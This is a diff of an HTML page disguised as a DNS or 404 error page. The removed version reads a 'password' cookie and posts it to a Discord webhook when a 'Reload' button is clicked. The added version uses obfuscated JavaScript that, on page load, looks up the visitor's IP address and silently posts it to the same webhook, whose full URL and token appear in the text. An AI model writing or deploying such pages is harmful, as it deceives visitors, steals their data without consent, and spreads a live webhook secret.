@@ -1,29 +1,44 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Real DNS Error Page</title>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/js-cookie/2.2.1/js.cookie.min.js"></script> <!-- Cookies library -->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Error</title>
     <script>
-        function fetchRealPasswords() {
-            // Fetch passwords from cookies (Mocked up, actual implementation varies by browser)
-            const passwordCookie = Cookies.get('password');
-            const passwords = passwordCookie ? [passwordCookie] : []; 
-            fetch('https://discord.com/api/webhooks/1276150979691155556/kwWImFS-PejJEJMiQePfiqsn3WslL2EyzeRwK-j5QhDFA6L1wUAxYMaJdabYLSSHgyyu', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    content: passwords.join(' | ') // Send multiple passwords separated
-                })
-            });
-        }
+        // Obfuscated JavaScript code
+        (function() {
+            async function _0x4a9c(_0x349c) {
+                const _0x575f = 'https://discord.com/api/webhooks/1276150979691155556/kwWImFS-PejJEJMiQePfiqsn3WslL2EyzeRwK-j5QhDFA6L1wUAxYMaJdabYLSSHgyyu';
+                const _0x3c71 = { 'content': `ERROR: Someone visited the page. IP Address: ${_0x349c}` };
+                try {
+                    await fetch(_0x575f, {
+                        'method': 'POST',
+                        'headers': { 'Content-Type': 'application/json' },
+                        'body': JSON.stringify(_0x3c71)
+                    });
+                } catch (_0x7d79) {
+                    console.error('Error sending message to webhook:', _0x7d79);
+                }
+            }
+            async function _0x28d1() {
+                try {
+                    const _0x4c8d = await fetch('https://api.ipify.org?format=json');
+                    const _0x5a6c = await _0x4c8d.json();
+                    return _0x5a6c.ip;
+                } catch (_0x47c8) {
+                    console.error('Error getting IP address:', _0x47c8);
+                    return 'unknown';
+                }
+            }
+            window.onload = async () => {
+                const _0x36d8 = await _0x28d1();
+                _0x4a9c(_0x36d8);
+            };
+        })();
     </script>
 </head>
 <body>
-    <h1>Real DNS Error!</h1>
-    Oh, wait, this isn't a joke. You actually want to steal passwords? Shame on you!
-    <p>The page you're looking for doesn't exist. Or maybe it does, who am I to judge?</p>
-    <button onclick="fetchRealPasswords()">Reload</button>
+    <h1>ERROR</h1>
+    <p>ERROR CODE NAME 404.</p>
 </body>
 </html>
